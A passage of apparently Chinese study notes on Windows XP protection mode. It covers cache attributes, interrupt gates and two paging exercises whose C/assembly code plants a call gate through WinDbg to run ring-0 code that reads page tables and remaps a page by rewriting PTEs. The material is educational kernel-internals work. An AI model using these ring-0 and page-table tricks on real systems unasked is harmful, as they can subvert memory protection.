<p>​    线性地址  &lt;—–&gt;  物理地址</p>
<p>CPU缓存：</p>
<p>​    物理地址  &lt;—–&gt;  物理地址中的内容</p>
<p>2、关于PWT&#x2F;PCD属性</p>
<p>PWT：Page Write Through</p>
<ul>
<li>PWT &#x3D;  1，写Cache的时候也要将数据写入内存中。</li>
<li>PWT &#x3D;  0，写Cache时由CPU控制寄存器决定是否写入内存。</li>
</ul>
<p>PCD：Page Cache Disable</p>
<ul>
<li>PCD &#x3D; 1，禁止某个页写入缓存，直接写内存。</li>
<li>PCD &#x3D; 0，可以写入Cache。</li>
</ul>
<p>比如，做页表用的页，已经存储在TLB中了，可以不需要再缓存了。</p>
<h2 id="5-保护模式：测试1"><a href="#5-保护模式：测试1" class="headerlink" title="5 保护模式：测试1"></a>5 保护模式：测试1</h2><p>以下代码对每一个线性地址都做了检查，起始这已经包括跨页检查了。</p>
<p>跨页检查的目的：如线性地址0x0040ffd，如果要取4字节内容，则最后一个字节在下一个页，这个时候还需要对下一个页的PDE、PTE做检查。而我的代码是对每一个线性地址做检查，粒度是每一个地址，而非页，所以自然包含了跨页内存检查。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.给定一个线性地址，根据地址读取指定长度内容。</span></span><br><span class="line"><span class="comment">int ReadMemory(OUT BYTE* buffer,IN DWORD dwAddr,IN DWORD dwLeght)</span></span><br><span class="line"><span class="comment">要求：</span></span><br><span class="line"><span class="comment">1) 可以自己指定分页方式。</span></span><br><span class="line"><span class="comment">2) 页不存在，要提示，不能报错。</span></span><br><span class="line"><span class="comment">3) 可以正确读取数据。</span></span><br><span class="line"><span class="comment">4）要考虑跨页数据的内存检查</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">VOID <span class="title">R0GetAddrText</span><span class="params">()</span></span>;</span><br><span class="line">DWORD dwRet = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> g_inti = <span class="number">0</span>;</span><br><span class="line">DWORD g_dwAddr,g_dwLen;</span><br><span class="line">BYTE g_Buffer[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">R0ParaPDEPTE</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">    	pushad;</span><br><span class="line">    	pushfd;</span><br><span class="line"></span><br><span class="line">    	<span class="comment">//获取参数中的线性地址和要获取的内容的长度</span></span><br><span class="line">    	<span class="comment">//int 3;</span></span><br><span class="line">    	mov eax,g_dwAddr;	<span class="comment">//获取dwAddr</span></span><br><span class="line">    	mov ecx,g_dwLen;	<span class="comment">//获取dwLeght</span></span><br><span class="line">    	mov edx,eax;		<span class="comment">//edx = eax == 线性地址</span></span><br><span class="line">    	<span class="comment">//判断读取长度</span></span><br><span class="line">    	cmp ecx,<span class="number">0x0</span>;</span><br><span class="line">    	mov dwRet,<span class="number">0x0</span>;		<span class="comment">//dwRet = dwLeght == 0，返回0，读取失败</span></span><br><span class="line">    	je __GoRet;</span><br><span class="line">    	<span class="comment">//jmp __GetPDE;		//不用jmp，会自动执行下面地址</span></span><br><span class="line"></span><br><span class="line">    	<span class="comment">//先找PDE</span></span><br><span class="line">__GetPDE:</span><br><span class="line">    	shr eax,<span class="number">18</span>;		<span class="comment">//eax = dwAddr&gt;&gt;18</span></span><br><span class="line">    	<span class="keyword">and</span> eax,<span class="number">0x3ff8</span>;		<span class="comment">//eax = (dwAddr&gt;&gt;18) &amp; 0x3ff8 = PDPTI * 4KB + PDI * 8</span></span><br><span class="line">    	add eax,<span class="number">0xc0600000</span>;	<span class="comment">//eax = C0600000 + PDPTI * 4KB + PDI * 8</span></span><br><span class="line">				<span class="comment">//eax 指向PDE</span></span><br><span class="line">    	mov eax,[eax];		<span class="comment">//eax = PDE低4字节</span></span><br><span class="line">    	mov esi,eax;		<span class="comment">//esi = eax == PDE低4字节</span></span><br><span class="line"></span><br><span class="line">    	<span class="comment">//判断PDE_P位</span></span><br><span class="line">    	<span class="keyword">and</span> eax,<span class="number">0x1</span>;		<span class="comment">//eax == PDE_P</span></span><br><span class="line">    	test eax,<span class="number">0x1</span>;</span><br><span class="line">    	mov dwRet,<span class="number">0x1</span>;		<span class="comment">//dwRet == 1		</span></span><br><span class="line">    	je __GoRet;		<span class="comment">//PDE_P == 0，返回1，读取失败</span></span><br><span class="line"></span><br><span class="line">    	<span class="comment">//判断PDE_PS位</span></span><br><span class="line">    	<span class="keyword">and</span> esi,<span class="number">0x80</span>;</span><br><span class="line">    	cmp esi,<span class="number">0x0</span>;</span><br><span class="line">    	je __GetPTE;		<span class="comment">//PDE_PS == 0，小页</span></span><br><span class="line">    	mov dwRet,<span class="number">0x1</span>;</span><br><span class="line">    	jmp __GoRet;</span><br><span class="line"></span><br><span class="line">    	<span class="comment">//再找PTE</span></span><br><span class="line">__GetPTE:</span><br><span class="line">    	mov eax,edx;</span><br><span class="line">    	shr eax,<span class="number">9</span>;		<span class="comment">//eax =dwAddr&gt;&gt;9</span></span><br><span class="line">    	<span class="keyword">and</span> eax,<span class="number">0x7ffff8</span>;	<span class="comment">//eax = (dwAddr &gt;&gt; 9) &amp; 0x7ffff8 = PDPTI * 2MB + PDI * 4KB + PTI * 8</span></span><br><span class="line">    	add eax,<span class="number">0xc0000000</span>;	<span class="comment">//eax = 0xc0000000 + PDPTI * 2MB + PDI * 4KB + PTI * 8</span></span><br><span class="line">	    			<span class="comment">//eax指向PTE</span></span><br><span class="line">    	mov eax,[eax];		<span class="comment">//eax = PTE低4字节</span></span><br><span class="line">    	mov edi,eax;		<span class="comment">//esi = eax == PTE</span></span><br><span class="line">    	<span class="comment">//判断PTE_P位</span></span><br><span class="line">    	<span class="keyword">and</span> eax,<span class="number">0x1</span>;		<span class="comment">//eax = PTE_P</span></span><br><span class="line">    	test eax,<span class="number">0x1</span>;</span><br><span class="line">    	mov dwRet,<span class="number">0x2</span>;</span><br><span class="line">    	je __GoRet;		<span class="comment">//PTE_P == 0，dwRet = 2，返回2，读取失败</span></span><br><span class="line"></span><br><span class="line">    	<span class="comment">//判断PTE_PAT</span></span><br><span class="line">    	<span class="keyword">and</span> edi,<span class="number">0x80</span>;</span><br><span class="line">    	test edi,<span class="number">0x1</span>;</span><br><span class="line">    	mov dwRet,<span class="number">0x3</span>;</span><br><span class="line">    	jne __GoRet;		<span class="comment">//PTE_PAT == 1，这种情况目前还不清楚，先不处理</span></span><br><span class="line">    	mov dwRet,<span class="number">0x4</span>;</span><br><span class="line"></span><br><span class="line">__GoRet:</span><br><span class="line">    	popfd</span><br><span class="line">        popad</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID __declspec(naked) R0GetAddrText()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">while</span>(g_dwLen)</span><br><span class="line">	&#123;</span><br><span class="line">		R0ParaPDEPTE();</span><br><span class="line">    <span class="keyword">switch</span>(dwRet)</span><br><span class="line">		&#123;</span><br><span class="line">	  		<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">	  		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">	  		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">	  		<span class="keyword">case</span> <span class="number">3</span>: __asm retf;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>: <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">memcpy</span>((PBYTE)((DWORD)g_Buffer+g_inti),(PBYTE)g_dwAddr,<span class="number">0x1</span>);</span><br><span class="line">		<span class="comment">//g_Buffer[g_inti] = ((PBYTE)g_dwAddr)[g_inti];</span></span><br><span class="line">		g_inti++;</span><br><span class="line">		g_dwAddr++;</span><br><span class="line">		g_dwLen--;</span><br><span class="line">	&#125;</span><br><span class="line">	__asm retf;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ReadMemory</span><span class="params">(OUT BYTE* buffer,IN DWORD dwAddr,IN DWORD dwLeght)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//1.若线性地址在低2G，则0~4KB与0x7FFFFFFF-4KB~0x7FFFFFFF为保留地址，不可读</span></span><br><span class="line">	<span class="comment">//实际判断PDE、PTE就可以，无须根据线性地址判断（线性地址的读写实际都是根据此判断的）</span></span><br><span class="line">	<span class="comment">//实际流程和函数MmIsAddressValid差不多</span></span><br><span class="line">	<span class="comment">//g_Buffer = buffer;</span></span><br><span class="line">	g_dwAddr = dwAddr;</span><br><span class="line">	g_dwLen = dwLeght;</span><br><span class="line"></span><br><span class="line">	BYTE CallGate[] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请在windbg执行: eq 8003f048 %04xec00`0008%04x\n&quot;</span>, ((DWORD)R0GetAddrText&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0x0000FFFF</span>,\</span><br><span class="line">         (DWORD)R0GetAddrText &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">  </span><br><span class="line">	system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line">	__asm</span><br><span class="line">	  &#123;</span><br><span class="line">	  	call fword ptr ds:[CallGate]</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	 <span class="keyword">switch</span>(dwRet)</span><br><span class="line">	 &#123;</span><br><span class="line">	  	<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">	  	&#123;</span><br><span class="line">	  		<span class="built_in">printf</span>(<span class="string">&quot;要读取内容的长度为0，请检查！\n&quot;</span>);</span><br><span class="line">	  		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	  	&#125;</span><br><span class="line">	  	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">	  	&#123;</span><br><span class="line">	  		<span class="built_in">printf</span>(<span class="string">&quot;要读取内容的PDE无效，请检查！\n&quot;</span>);</span><br><span class="line">	  		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	  	&#125;</span><br><span class="line">	  	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">	  	&#123;</span><br><span class="line">	  		<span class="built_in">printf</span>(<span class="string">&quot;访问空地址或当前内存读取错误(PTE),请检查！\n&quot;</span>);</span><br><span class="line">	  		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	  	&#125;</span><br><span class="line">	  	<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">	  	&#123;</span><br><span class="line">	  		<span class="built_in">printf</span>(<span class="string">&quot;要读取内容的PTE_PAT = 1，目前该程序还不支持！\n&quot;</span>);</span><br><span class="line">	  		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	  	&#125;</span><br><span class="line">	  	<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">	  	&#123;</span><br><span class="line">	  		<span class="built_in">printf</span>(<span class="string">&quot;读取成功！\n&quot;</span>);</span><br><span class="line">	  		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	  	&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">	  	&#123;</span><br><span class="line">	  		<span class="built_in">printf</span>(<span class="string">&quot;有毒！\n&quot;</span>);</span><br><span class="line">	  		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	  	&#125;</span><br><span class="line">	 &#125;</span><br><span class="line">	 <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2-9-9-12分页</span></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	DWORD bTestNum = <span class="number">0x666</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;测试地址%x\n&quot;</span>,&amp;bTestNum);</span><br><span class="line">	DWORD dwAddr,dwLen;</span><br><span class="line">	BYTE bBuffer[<span class="number">0x1000</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;函数功能：读取指定地址处的指定长度的内容！(0-4096字节)\n请输入指定地址(十六进制)：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%x&quot;</span>,&amp;dwAddr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输入要读取字节长度：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;dwLen);</span><br><span class="line">  </span><br><span class="line">	ReadMemory(bBuffer,dwAddr,dwLen);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;读取内容：&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(dwRet == <span class="number">0x4</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;读取内容：&quot;</span>);</span><br><span class="line">		<span class="keyword">for</span>(;dwLen &gt; <span class="number">0</span>;)</span><br><span class="line">		&#123;</span><br><span class="line">			dwLen--;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>,g_Buffer[dwLen]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/01/10/hxZFjLwd14ypgWY.png" alt="56.png"></p>
<h2 id="6-保护模式：测试2"><a href="#6-保护模式：测试2" class="headerlink" title="6 保护模式：测试2"></a>6 保护模式：测试2</h2><p>题目：</p>
<p>申请长度为100的DWORD的数组，且每项的值用该项的地址初始化；<br>把这个数组所在的物理页挂到0x1000的地址上；<br>定义一个指针，指向0x1000这个页里的数组所在的地址,用0x1000这个页的线性地址打印出这数组的值。</p>
<p>要求：<br>数组所在的物理页，是同一个页。</p>
<p>本题在：2-9-9-12分页模式下，页大小：4KB，PTE_PAT &#x3D; 0条件下解题。</p>
<ol>
<li>先获取数组pArr的PDE、PTE。</li>
<li>检查线性地址0x1000的PDE_P：（若PDE存在且PS &#x3D; 1，仅需要替换PTE即可）<ul>
<li>PDE_P &#x3D; 1，判断PDE_PS：<ul>
<li>PDE_PS &#x3D; 0，则直接用pArr的PTE替换即可。</li>
<li>PDE_PS &#x3D; 1，替换PDE和PTE。</li>
</ul>
</li>
</ul>
</li>
<li>修改PTE就要清空TLB。</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">PDWORD pArr = <span class="literal">NULL</span>;</span><br><span class="line">DWORD dwArr = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">VOID __declspec(naked) CallGate_RW8003f048()</span><br><span class="line">&#123;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    pushad;</span><br><span class="line">    pushfd;</span><br><span class="line">    <span class="comment">//先找pArr的PDE</span></span><br><span class="line">    <span class="comment">//int 3;</span></span><br><span class="line">    mov eax,dwArr;</span><br><span class="line">    push eax;</span><br><span class="line">    shr eax,<span class="number">18</span>;			<span class="comment">//eax = dwAddr&gt;&gt;18</span></span><br><span class="line">    <span class="keyword">and</span> eax,<span class="number">0x3ff8</span>;		<span class="comment">//eax = (dwAddr&gt;&gt;18) &amp; 0x3ff8 = PDPTI * 4KB + PDI * 8</span></span><br><span class="line">    add eax,<span class="number">0xc0600000</span>;		<span class="comment">//eax = C0600000 + PDPTI * 4KB + PDI * 8</span></span><br><span class="line">    				<span class="comment">//eax 指向PDE</span></span><br><span class="line">    mov eax,[eax];		<span class="comment">//eax = PDE低4字节</span></span><br><span class="line">    mov ebx,eax;		<span class="comment">//ebx = eax = PDE低4字节</span></span><br><span class="line">    <span class="comment">//再找pArr的PTE</span></span><br><span class="line">    pop eax;</span><br><span class="line">    shr eax,<span class="number">9</span>;			<span class="comment">//eax =dwAddr&gt;&gt;9</span></span><br><span class="line">    <span class="keyword">and</span> eax,<span class="number">0x7ffff8</span>;		<span class="comment">//eax = (dwAddr &gt;&gt; 9) &amp; 0x7ffff8 = PDPTI * 2MB + PDI * 4KB + PTI * 8</span></span><br><span class="line">    add eax,<span class="number">0xc0000000</span>;		<span class="comment">//eax = 0xc0000000 + PDPTI * 2MB + PDI * 4KB + PTI * 8</span></span><br><span class="line">    				<span class="comment">//eax指向PTE</span></span><br><span class="line">    mov eax,[eax];		<span class="comment">//eax = PTE低4字节</span></span><br><span class="line">    mov ecx,eax;		<span class="comment">//ecx = eax = PTE低4字节</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//找0x1000的PDE;</span></span><br><span class="line">    mov eax,<span class="number">0x1000</span>;</span><br><span class="line">    mov esi,eax;</span><br><span class="line">    shr eax,<span class="number">18</span>;			<span class="comment">//eax = dwAddr&gt;&gt;18</span></span><br><span class="line">    <span class="keyword">and</span> eax,<span class="number">0x3ff8</span>;		<span class="comment">//eax = (dwAddr&gt;&gt;18) &amp; 0x3ff8 = PDPTI * 4KB + PDI * 8</span></span><br><span class="line">    add eax,<span class="number">0xc0600000</span>;		<span class="comment">//eax = C0600000 + PDPTI * 4KB + PDI * 8</span></span><br><span class="line">    </span><br><span class="line">    mov edx,eax;		<span class="comment">//edx = eax指向0x1000的PDE</span></span><br><span class="line">    mov eax,[eax];		<span class="comment">//eax = PDE低4字节</span></span><br><span class="line">    mov edi,eax;		<span class="comment">//edi = eax = 0x1000的PDE低4字节</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//判断0x1000_PDE_P位</span></span><br><span class="line">    <span class="keyword">and</span> eax,<span class="number">0x1</span>;		<span class="comment">//eax == PDE_P</span></span><br><span class="line">    test eax,<span class="number">0x1</span>;</span><br><span class="line">    je __FixPDE;		<span class="comment">//PDE_P == 0，修改PDE</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//判断0x1000_PDE_PS位</span></span><br><span class="line">    <span class="keyword">and</span> edi,<span class="number">0x80</span>;</span><br><span class="line">    test edi,<span class="number">0x1</span>;</span><br><span class="line">    jne __FixPDE;		<span class="comment">//0x1000_PDE_PS == 1，大页</span></span><br><span class="line">   </span><br><span class="line">__FIXPTE:</span><br><span class="line">    mov eax,esi;</span><br><span class="line">    shr eax,<span class="number">9</span>;			<span class="comment">//eax =dwAddr&gt;&gt;9</span></span><br><span class="line">    <span class="keyword">and</span> eax,<span class="number">0x7ffff8</span>;		<span class="comment">//eax = (dwAddr &gt;&gt; 9) &amp; 0x7ffff8 = PDPTI * 2MB + PDI * 4KB + PTI * 8</span></span><br><span class="line">    add eax,<span class="number">0xc0000000</span>;		<span class="comment">//eax = 0xc0000000 + PDPTI * 2MB + PDI * 4KB + PTI * 8</span></span><br><span class="line">    				<span class="comment">//eax指向PTE</span></span><br><span class="line">    mov [eax],ecx;		<span class="comment">//0x1000_PTE = pAddr_PTE</span></span><br><span class="line">    INVLPG dword ptr ds:[<span class="number">0x1000</span>];<span class="comment">//清空0x1000的TLB</span></span><br><span class="line"></span><br><span class="line">__GoRet:</span><br><span class="line">    popfd;</span><br><span class="line">    popad;</span><br><span class="line">    retf;</span><br><span class="line">    </span><br><span class="line">__FixPDE:</span><br><span class="line">    mov [edx],ebx;		<span class="comment">//0x1000_PDE = pAddr_PDE</span></span><br><span class="line">    jmp __FIXPTE;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">  DWORD i = <span class="number">0</span>;</span><br><span class="line">  BYTE CallGate[] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">  pArr = (PDWORD)VirtualAlloc(<span class="number">0</span>,<span class="number">0x1000</span>,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">  dwArr = (DWORD)pArr;</span><br><span class="line">  <span class="keyword">while</span>(i &lt; <span class="number">100</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    pArr[i] =  (DWORD)&amp;pArr[i];</span><br><span class="line">    i++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;请在windbg执行: eq 8003f048 %04xec00`0008%04x\n&quot;</span>, ((DWORD)CallGate_RW8003f048&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0x0000FFFF</span>,\</span><br><span class="line">         (DWORD)CallGate_RW8003f048 &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">  </span><br><span class="line">  system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line">  __asm</span><br><span class="line">  	&#123;</span><br><span class="line">    	call fword ptr ds:[CallGate];</span><br><span class="line">  	&#125;</span><br><span class="line">	</span><br><span class="line">  PDWORD p = (PDWORD)<span class="number">0x1000</span>;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(i &lt; <span class="number">100</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;元素 %d 的值为：%x\n&quot;</span>,i+<span class="number">1</span>,p[i]);</span><br><span class="line">    i++;</span><br><span class="line">  &#125;</span><br><span class="line">	system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img data-src="https://s2.loli.net/2022/01/11/fQZOMGjc3rpvHKw.png" alt="57.png"></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>保护模式</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>WinXP内核</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows XP 段保护（三）</title>
    <url>/post/WinXP-ProtectionMode-Segment3/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="1-中断门"><a href="#1-中断门" class="headerlink" title="1 中断门"></a>1 中断门</h2><div class="note success"><p>回顾：</p>
<p><strong>保护模式保护的是内存、特权指令（保护寄存器）</strong>。</p>
<ol>
<li>调用门3环堆栈切换到0环堆栈：ESP0、SS0来自TSS，而TSS由Windows的线程提供。</li>
<li>实际上3环进0环<strong>是在一个线程上执行的</strong>，该线程从3环进到0环，维护两个堆栈（一个是3环的，一个是0环的），线程从0环返回时并不会破环0环的堆栈，下次该线程再进0环时将从ESP0处继续使用堆栈。</li>
<li>一个核只有一个TSS（内存块），该CPU共享。但是不同的线程一般TSS值不同（TSS可修改，线程切换时将值填到TSS中）。</li>
</ol>
</div>

<p><strong>Windows没有使用调用门</strong>，但是使用了中断门：</p>
<ol>
<li>系统调用（老的CPU，从3环到0环。新的CPU直接通过快速调用）</li>
<li>调试（int 3）</li>
</ol>
<p>执行调用门的指令：<code>CALL CS:EIP</code>，CS是段选择子，包含了查找<mark class="label info">GDT</mark>表的是一个索引。<br>但当CPU执行如下指令：<mark class="label danger">INT N</mark>，查询的却是另外一张表，这张表叫<mark class="label info">IDT</mark>。</p>
<p>IDT即中断描述符表，同GDT一样，IDT也是由一系列描述符组成的，每个描述符占8个字节。但要注意的是，IDT表中的第一个元素不是NULL。</p>
<p>IDT 表包含三种门描述符（具体参看Intel开发手册卷3的6.10 IDT）：</p>
<ol>
<li>中断门描述符</li>
<li>任务门描述符</li>
<li>陷阱门描述符</li>
</ol>
<p>使用windbg查看IDT表的基地址和长度：</p>
<p><img data-src="https://s2.loli.net/2021/12/18/jUuGQ5veICknKBi.png" alt="52.png"></p>
<p>关于GDTR、IDTR、LDTR、TR寄存器可查看Intel开发手册卷3的2.4内存管理寄存器。</p>
<p><img data-src="https://s2.loli.net/2021/12/18/i18sCte3UGb6vyf.png" alt="53.png"></p>
<ol>
<li><p><strong>中断门描述符：</strong>可以看到，中断门是没有参数的。</p>
<p>D&#x3D;1，32位的中断门描述符，Type&#x3D;0x1110&#x3D;0xE。</p>
<p>D&#x3D;0，16位的中断门描述符，Type&#x3D;0x0110&#x3D;0x6。</p>
<p><img data-src="https://s2.loli.net/2021/12/19/ZgXQUSETRpABVhM.png" alt="54.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/19/RNkserCWtXMZF5D.png" alt="55.png"></p>
</li>
<li><p><strong>本文描述的是软件中断（软中断）</strong>。</p>
</li>
</ol>
<ul>
<li><p>使用INT N来实现的中断是软中断，N&#x3D;0～255，N称为中断向量，也是IDT表的索引。</p>
</li>
<li><p>N&#x3D;32～255为用户自定义的中断，当前P&#x3D;0。</p>
</li>
</ul>
<p>各类中断号对应的含义如下图：</p>
<p><img data-src="https://s2.loli.net/2021/12/19/BcpDH8f6i1whAxo.png" alt="59.png"></p>
<ol start="2">
<li><p><strong>中断门的执行流程：</strong></p>
<p><img data-src="https://s2.loli.net/2021/12/19/rokeOft5ChbxJMz.png" alt="56.png"></p>
<p><img data-src="https://s2.loli.net/2022/01/25/etX6hsudkyCVbRn.png" alt="35.png"></p>
<p><strong>指明中断门的段选择子指向的GDT段描述符需要是一个代码段描述符（和调用门中的段选择子一样都是指向代码段描述符）。</strong></p>
</li>
</ol>
<div class="note danger"><p>中断门执行流程：</p>
<ol>
<li><p>当执行<code>int n</code>时，以n为索引（下标）去IDT表找对应的描述符，这个n是几就找到IDT表对应的第n+1个(从0开始)。</p>
</li>
<li><p>获取到中断门段描述符后检查权限，进行段权限检查(没有RPL，只检查CPL，CPL&gt;&#x3D;DPL)。</p>
</li>
<li><p>权限检查通过后，获取新的段选择子（中断门描述符16-31位）与之对应的GDT表中的段描述符的Base，再加上IDT表中的Offset作为EIP去跳转，即$EIP &#x3D; IDT-Interrupt-Segment-Description.Offset ⊕ GDT-Descriptor.Base$</p>
</li>
</ol>
</div>

<ol start="4">
<li><strong>中断门的堆栈切换</strong>（中断门没有参数）：</li>
</ol>
<p><img data-src="https://s2.loli.net/2021/12/19/Tf5bvzJd78KRPLV.png" alt="57.png"></p>
<ol start="5">
<li><p><strong>中断门的返回：</strong></p>
<p><code>INT N</code>指令：<br>1、在没有权限切换时，会向堆栈PUSH3个值，分别是：<br>CS EFLAG EIP（返回地址）<br>2、在有权限切换时，会向堆栈PUSH5个值，分别是<br>SS ESP EFLAG CS EIP<br><strong>在中断门中，不能通过RETF返回，而应该通过IRET&#x2F;IRETD指令返回。</strong></p>
</li>
</ol>
<p>中断门的返回：</p>
<ul>
<li>16位：<code>iret</code></li>
<li>32位：<code>iretd</code></li>
<li>64位：<code>iretq</code></li>
</ul>
<p>调用门的返回：<code>retf</code>。</p>
<div class="note warning"><p>iretd比retf多返回一个EFLAG寄存器，该寄存器在中断门执行时，将IF位清零（EFLAG寄存器下标位9的位），如果IF位为0，那CPU将不再接收可屏蔽中断。（具体可见Intel手册卷3第六章中断和异常）</p>
</div>

<p>从硬件层面来看，中断分为可屏蔽（受IF位影响，IF&#x3D;0，可屏蔽中断，中断产生时CPU不管）和不可屏蔽。</p>
<p><img data-src="https://s2.loli.net/2021/12/19/ySQIR7D1LpUgh3v.png" alt="58.png"></p>
<h3 id="1-1-中断门段权限检查"><a href="#1-1-中断门段权限检查" class="headerlink" title="1.1 中断门段权限检查"></a>1.1 中断门段权限检查</h3><ol>
<li>中断门描述符DPL &gt; CS段描述符的DPL，即中断门描述符<strong>DPL&#x3D;CPL&#x3D;3&gt;CS.DPL&#x3D;0</strong>。</li>
<li>中断门描述符<strong>RPL&#x3D;0&#x2F;3</strong>。</li>
</ol>
<h3 id="1-2-调用门和中断门的区别"><a href="#1-2-调用门和中断门的区别" class="headerlink" title="1.2 调用门和中断门的区别"></a>1.2 调用门和中断门的区别</h3><ol>
<li>调用门通过call far指令执行，但中断门通过int指令执行。</li>
<li>调用门查GDT表，中断门查IDT表后再查GDT表。</li>
<li>call cs:eip中的CS是段选择子，由三部分组成。但int [index]指令中的index只是索引，中断门不检查RPL，只检查CPL。</li>
<li>调用门可以有参数，但中断门没有。</li>
